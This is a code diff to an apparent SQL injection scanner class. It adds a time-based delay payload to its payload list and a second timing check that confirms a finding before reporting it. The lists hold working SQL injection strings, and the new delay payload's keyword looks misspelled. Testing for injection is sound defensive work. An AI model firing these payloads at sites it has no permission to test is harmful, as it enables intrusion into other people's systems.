@@ -15,7 +15,9 @@ class SqliManager:
         self.error_based_payloads = ['\'', '\\', '"', '%27', '%5C']
         self.time_based_payloads = [
             {'TruePld': '1\'OR(if(1=1,sleep(5),0))OR\'2', 'FalsePld': '1\'OR(if(1=2,sleep(5),0))OR\'2'},
-            {'TruePld': '1\'OR(if(1=1,sleep(5),0))--%20', 'FalsePld': '1\'OR(if(1=2,sleep(5),0))--%20'}]
+            {'TruePld': '1\'OR(if(1=1,sleep(5),0))--%20', 'FalsePld': '1\'OR(if(1=2,sleep(5),0))--%20'},
+            {'TruePld': '1; WAIT FOR DELAY \'00:00:05\'', 'FalsePld': '1; WAIT FOR DELAY \'00:00:01\''},
+        ]
         self.delay_in_seconds = 5
 
     def check_get_requests(self, dtos: List[GetRequestDTO]):
@@ -84,7 +86,9 @@ class SqliManager:
             if response1.elapsed.total_seconds() >= self.delay_in_seconds:
                 response2 = requests.get(false_payload, headers=self.headers, cookies=self.cookies)
                 if response2.elapsed.total_seconds() < self.delay_in_seconds:
-                    print(f"SQLiManager delay FOUND: - {true_payload} - {false_payload}")
-                    return result.append(SqliFoundDTO(true_payload, SqliType.TIME))
+                    response1 = requests.get(true_payload, headers=self.headers, cookies=self.cookies)
+                    if response1.elapsed.total_seconds() >= self.delay_in_seconds:
+                        print(f"SQLiManager delay FOUND: - {true_payload} - {false_payload}")
+                        return result.append(SqliFoundDTO(true_payload, SqliType.TIME))
         except Exception as inst:
             print(f"Exception - ({true_payload}) - {inst}")
